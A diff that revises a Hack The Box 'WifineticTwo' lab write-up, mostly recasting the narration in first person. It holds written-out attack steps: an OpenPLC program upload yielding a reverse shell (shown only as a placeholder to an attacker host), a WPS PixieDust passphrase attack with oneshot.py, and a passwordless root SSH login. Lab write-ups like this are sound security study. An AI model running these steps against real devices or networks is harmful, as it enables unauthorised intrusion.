@@ -38,7 +38,7 @@ outcome: "Root code execution in the PLC container, WPA2 credential recovery via
 
 ## OpenPLC extension to PixieDust router root
 
-WifineticTwo is a Medium Linux Hack The Box lab that combines industrial-control application abuse with a wireless pivot. An OpenPLC runtime reachable with its default credentials accepts an uploaded Structured Text program whose C extension is compiled and executed by the PLC runtime, yielding a root shell inside a container that carries a wireless interface. A WPS PixieDust attack against a nearby access point recovers the WPA2 passphrase, and association with that network exposes a router whose SSH service accepts a passwordless root login. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/). The reverse-shell payload is shown as a placeholder pattern only.
+WifineticTwo is a Medium Linux Hack The Box lab that combines industrial-control application abuse with a wireless pivot. An OpenPLC runtime reachable with its default credentials accepts an uploaded Structured Text program, compiles and executes its C extension, and produces a root shell inside a container that carries a wireless interface. A WPS PixieDust attack against a nearby access point recovers the WPA2 passphrase, and association with that network exposes a router whose SSH service accepts a passwordless root login. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/). The reverse-shell payload is shown as a placeholder pattern only.
 
 **Attack path:** **Default-credential OpenPLC runtime → Structured Text C-extension execution → container root → wireless AP discovery → WPS PixieDust credential recovery → WPA2 association → passwordless root SSH on the router**
 
@@ -47,7 +47,7 @@ WifineticTwo is a Medium Linux Hack The Box lab that combines industrial-control
 - **Target:** Linux host exposing SSH (22) and a web-facing OpenPLC runtime (8080).
 - **Starting position:** unauthenticated network access, no provided credentials.
 - **Objective:** assess the path from the exposed industrial-control interface to the adjacent wireless segment and the router.
-- **Constraints:** activity was confined to the Hack The Box lab environment.
+- **Constraints:** activity stayed inside the Hack The Box lab environment.
 
 ## Evidence: OpenPLC extension, PixieDust, and router SSH
 
@@ -64,15 +64,15 @@ nmap -sC -sV -p- --min-rate 5000 -oA nmap/wifinetictwo <TARGET_IP>
 8080/tcp open  http-proxy   HAProxy / Werkzeug 1.0.1 Python/2.7.18
 ```
 
-Significance: port 8080 serves the OpenPLC runtime web interface, providing the application surface evaluated next.
+Significance: port 8080 is the OpenPLC runtime web interface, the application surface evaluated next.
 
 Result: the scan identifies SSH and the OpenPLC web interface on the target.
 
 ### OpenPLC program execution
 
-Observation: the OpenPLC runtime is reachable with its default credentials, and its Structured Text format supports C extensions through custom output functions. The source records that those defaults granted access to the runtime.
+Observation: the OpenPLC runtime is reachable with its default credentials, and its Structured Text format supports C extensions through custom output functions. I tried the default credentials and they granted access to the runtime.
 
-Action: a Structured Text program containing a C extension was uploaded through **Programs → Upload Program**, then compiled and started through **Dashboard → Start PLC**. The payload is summarized as a placeholder pattern rather than reproduced.
+Action: I uploaded a Structured Text program containing a C extension through **Programs → Upload Program**, then compiled and started it through **Dashboard → Start PLC**. The payload is shown as a placeholder pattern only.
 
 ```text
 <ST_PROGRAM_WITH_C_EXTENSION>   # reverse shell to <ATTACKER_HOST>:<LISTEN_PORT>
@@ -94,7 +94,7 @@ Result: the listener returns a root shell inside the container.
 
 Observation: the container exposes a managed wireless interface, and scanning finds a nearby access point with WPS enabled.
 
-Action: the interface and nearby wireless capabilities were inspected.
+Action: I inspected the interface and nearby wireless capabilities.
 
 ```bash
 iw dev
@@ -129,7 +129,7 @@ python3 oneshot.py -b <AP_MAC_ADDRESS> -i <WIRELESS_INTERFACE> -K
 [+] AP SSID: '<WIRELESS_SSID>'
 ```
 
-Significance: PixieDust targets access points that use predictable WPS E-S1/E-S2 nonces, allowing near-instant recovery of the WPA2 passphrase where the implementation is vulnerable.
+Significance: PixieDust targets access points that use predictable WPS E-S1/E-S2 nonces, so WPA2 passphrase recovery is near-instant where the implementation is vulnerable.
 
 Result: a WPS PIN and the WPA2 passphrase are recovered.
 
@@ -137,7 +137,7 @@ Result: a WPS PIN and the WPA2 passphrase are recovered.
 
 Observation: the recovered WPA2 passphrase allows association with the wireless network and a DHCP lease.
 
-Action: a supplicant configuration was created, the container associated with the access point, and a lease was requested.
+Action: I created a supplicant configuration, associated the container with the access point, and requested a lease.
 
 ```bash
 wpa_supplicant -B -i <WIRELESS_INTERFACE> -c <WPA_CONFIG>
@@ -149,7 +149,7 @@ ip addr show <WIRELESS_INTERFACE>
 inet <DHCP_LEASE>
 ```
 
-Significance: association crosses the container boundary onto the wireless segment, placing the adjacent network in reach.
+Significance: association crosses the container boundary onto the wireless segment, which puts the adjacent network in reach.
 
 Result: the interface receives a DHCP lease on the wireless network.
 
@@ -157,7 +157,7 @@ Result: the interface receives a DHCP lease on the wireless network.
 
 Observation: the wireless network exposes a reachable gateway, and SSH is one of its open services.
 
-Action: the gateway was identified by ARP, its services confirmed, and SSH was attempted with the root account.
+Action: I identified the gateway by ARP, confirmed its services, and attempted SSH with the root account.
 
 ```bash
 arp -a
@@ -182,7 +182,7 @@ Result: an unauthenticated root shell is obtained on the router.
 
 ## Outcome: container root, WPA2 recovery, and router root SSH
 
-The evidence establishes root code execution inside the OpenPLC container, recovery of the WPA2 wireless credential through a WPS PixieDust attack, and a passwordless root SSH session on the adjacent router. No step beyond the lab was validated.
+The evidence establishes root code execution inside the OpenPLC container, recovery of the WPA2 wireless credential through a WPS PixieDust attack, and a passwordless root SSH session on the adjacent router. The reverse-shell payload was not reproduced here, and no step beyond the lab was validated.
 
 ## Recommendations: default ICS credentials, WPS, and passwordless root SSH
 
